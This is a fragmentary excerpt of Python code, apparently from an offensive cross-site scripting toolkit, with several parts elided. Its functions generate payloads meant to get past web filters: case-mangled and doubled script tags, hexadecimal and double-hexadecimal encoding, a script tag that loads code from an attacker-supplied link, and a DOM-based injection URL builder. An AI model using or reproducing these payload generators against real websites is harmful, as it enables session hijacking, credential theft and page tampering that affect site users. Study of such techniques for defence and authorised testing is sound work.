...
def xss_reflected_bypass(string):
    ...
    a.append(string.replace("<script>", "<<ScRipT>").replace(
        "</script>", "//<</sCrIPt>"))
    ############################################
    ...
    ############################################
    # A Method To Bypass Policy.
    last_str = string.replace("<script>", "<script&param=>").replace(
        "</script>", "</&param=script>")
    a.append("You Should Replace 'param' With Target Variable :" + last_str)
    ############################################
    # Encode Symbols Of String To Hexadecimal
    xss_obj = xss()
    a.append(xss_obj.encode_symbol_hexadecimal(string))
    ############################################
    # Double Encode Symbols Of String To Hexadecimal
    a.append(xss_obj.double_encode_symbol_hexadecimal(string))
    ############################################
    return a
...
def xss_exploits(link):
    ...
    AllLinks[0].href = \"" + link + "\"; }</script> ")
    ############################################
    # A Method To Bypass Policy.
    a.append("<SCRIPT%20a=\">\"%20SRC=\"" + link + "\"></SCRIPT>")
    ############################################
    return a
...
def xss_dom_bypass(target, exploit_string):
    ...
    ready_string = url + "?payload=" + key + "=" + \
        exploit_string + "&" + key + "=something"
